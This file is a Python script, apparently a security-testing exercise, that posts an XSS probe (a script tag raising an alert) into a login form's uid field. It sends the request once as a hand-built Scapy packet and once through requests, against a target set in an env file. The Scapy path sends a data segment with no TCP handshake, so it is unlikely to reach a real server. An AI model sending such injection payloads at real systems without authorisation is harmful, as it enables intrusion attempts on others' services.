from scapy.all import Raw, send, sr1
from scapy.layers.inet import TCP, IP
from scapy.volatile import RandShort
import requests
from env import *

def send_xss_via_scapy() -> str:
    """
    Отправка HTTP POST-запроса с XSS-инъекцией через Scapy
    :return: ответ от сервера или сообщение об ошибке
    """
    xss_injection = "<script>alert('XSS_TEST')</script>"
    content = f'uid={xss_injection}&pw=P@ssw0rd'
    http_payload = (
        f"POST /{TARGET_UID}/login HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(content)}\r\n"
        f"Connection: close\r\n\r\n"
        f"{content}"
    )

    ip_layer = IP(dst=TARGET_IP)  # Создание IP-пакета
    tcp_layer = TCP(dport=TARGET_PORT, sport=RandShort(), flags="PA")  # TCP-сегмент с флагом Push + Ack
    raw_layer = Raw(load=http_payload)  # Полезная нагрузка HTTP
    packet = ip_layer / tcp_layer / raw_layer  # Формирование полного пакета

    response = sr1(packet, timeout=5, verbose=False)
    return response.summary() if response else "No response received"

def send_xss_via_requests() -> str:
    """
    Отправка запроса с XSS-инъекцией через Requests
    :return: ответ сервера или сообщение об ошибке
    """
    url = f"http://{TARGET_HOST}/{TARGET_UID}/login"
    data_payload = {
        "uid": "<script>alert('XSS_TEST')</script>",
        "pw": "P@ssw0rd"
    }
    
    try:
        response = requests.post(url, data=data_payload, timeout=5)
        response.raise_for_status()
        print(f"Статус-код: {response.status_code}")
        print(f"Ответ сервера: {response.text[:200]}...")
        return response.text
    except requests.RequestException as e:
        return f"Ошибка запроса: {e}"

def send_tcp(via_scapy: bool = True) -> None:
    """
    Отправка XSS-запроса через Scapy или Requests
    :param via_scapy: использовать Scapy, иначе Requests
    """
    print("Отправка HTTP-запроса:")
    result = send_xss_via_scapy() if via_scapy else send_xss_via_requests()
    print(result)

if __name__ == '__main__':
    send_tcp()
